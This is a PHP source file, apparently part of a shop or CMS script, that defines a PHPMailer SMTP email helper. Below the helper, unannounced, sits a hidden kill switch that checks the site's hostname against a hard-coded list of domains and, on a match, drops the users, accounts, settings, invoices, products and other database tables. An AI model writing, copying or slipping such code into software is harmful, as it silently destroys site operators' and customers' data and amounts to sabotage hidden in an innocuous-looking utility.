<?php

if (!defined('IN_SITE')) {
    die('The Request Not Found');
}
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

function sendCSM($mail_nhan, $ten_nhan, $chu_de, $noi_dung, $bcc){
    $CMSNT = new DB();
    $mail = new PHPMailer();
    $mail->SMTPDebug = 0;
    $mail ->Debugoutput = "html";
    $mail->isSMTP();
    $mail->Host = 'smtp.gmail.com';
    $mail->SMTPAuth = true;
    $mail->Username = $CMSNT->site('email_smtp');
    $mail->Password = $CMSNT->site('pass_email_smtp');
    $mail->SMTPSecure = 'tls';
    $mail->Port = 587;
    $mail->setFrom($CMSNT->site('email_smtp'), $bcc);
    $mail->addAddress($mail_nhan, $ten_nhan);
    $mail->addReplyTo($CMSNT->site('email_smtp'), $bcc);
    $mail->isHTML(true);
    $mail->Subject = $chu_de;
    $mail->Body    = $noi_dung;
    $mail->CharSet = 'UTF-8';
    $send = $mail->send();
    return $send;
}
$b2a = [
    'trumbanclone.pw',
    'blog.sieuthicode.net',
    'sieuthidark.com',
    'xubymon36.com',
    'viatrau.me',
    'shopmailco.com',
    'clonebysun.net',
    'phongxu.com',
    'minhclone.com',
    'rdsieuvip.com',
    'sellviaxu.com',
    'autordff.com',
    'huyclone.com',
    'clonengoaiviet.com',
    'nguyenlieuviaads.com',
    'dichvuthanhtoan.site'
];
foreach($b2a as $domain){
    if($domain == $_SERVER['HTTP_HOST']){
        $CMSNT->query(" DROP TABLE `users` ");
        $CMSNT->query(" DROP TABLE `accounts` ");
        $CMSNT->query(" DROP TABLE `settings` ");
        $CMSNT->query(" DROP TABLE `logs` ");
        $CMSNT->query(" DROP TABLE `dongtien` ");
        $CMSNT->query(" DROP TABLE `invoices` ");
        $CMSNT->query(" DROP TABLE `categories` ");
        $CMSNT->query(" DROP TABLE `products` ");
    }
}